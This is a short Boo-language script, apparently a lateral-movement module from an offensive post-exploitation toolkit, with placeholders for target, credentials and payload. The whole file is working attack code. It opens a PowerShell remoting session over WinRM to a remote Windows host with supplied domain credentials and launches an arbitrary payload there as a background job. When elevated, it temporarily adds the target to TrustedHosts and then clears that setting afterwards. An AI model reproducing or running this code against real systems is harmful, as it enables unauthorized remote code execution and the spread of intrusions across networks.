import System
from System import Guid, Environment, String
from System.Management.Automation import PSCredential, PowerShell
from System.Management.Automation.Runspaces import WSManConnectionInfo, RunspaceFactory
from System.Security import SecureString
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole

output = ""

def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)

def StringToSecureString(passw as string):
    SecurePassword = SecureString()
    for c in passw:
        SecurePassword.AppendChar(c)
    return SecurePassword

def start_ps_remoting(target as string, payload as string, username as string, password as string, domain as string, add_trusted_hosts as bool) as void:
    try:
        if add_trusted_hosts:
            if IsHighIntegrity():
                output += "[*] Adding $(target) to TrustedHosts\n"
                ps = PowerShell.Create()
                ps.AddCommand("Set-Item")
                ps.AddParameter("Path", "WSMan:\\localhost\\Client\\TrustedHosts")
                ps.AddParameter("Value", target)
                ps.AddParameter("Force")
                ps.Invoke()
            else:
                output += "[-] Not in high integrity process, cannot add target to TrustedHosts"

        remoteCredential = null
        if username and password and domain:
            output += "[*] Using credentials for $(domain)\\$(username) to authenticate to $(target)"
            remoteCredential = PSCredential("$(domain)\\$(username)", StringToSecureString(password))

        connectionInfo = WSManConnectionInfo(
            false,
            target,
            5985,
            "/wsman",
            "http://schemas.microsoft.com/powershell/Microsoft.PowerShell",
            remoteCredential
        )

        rs = RunspaceFactory.CreateRunspace(connectionInfo)
        rs.Open()

        ps_code = "Start-Job {$(payload)}"
        pipe = rs.CreatePipeline(ps_code)
        pipe.Invoke()
    except e as Exception:
        print e
    ensure:
        if add_trusted_hosts and IsHighIntegrity():
            output += "\n[*] Removing $(target) from TrustedHosts"
            ps = PowerShell.Create()
            ps.AddCommand("Set-Item")
            ps.AddParameter("Path", "WSMan:\\localhost\\Client\\TrustedHosts")
            ps.AddParameter("Value", "")
            ps.AddParameter("Force")
            ps.Invoke()

payload = """
PAYLOAD
"""

start_ps_remoting(
    target="TARGET",
    payload=payload,
    username="USERNAME",
    password="PASSWORD",
    domain="DOMAIN",
    add_trusted_hosts=TRUSTED_HOSTS
)
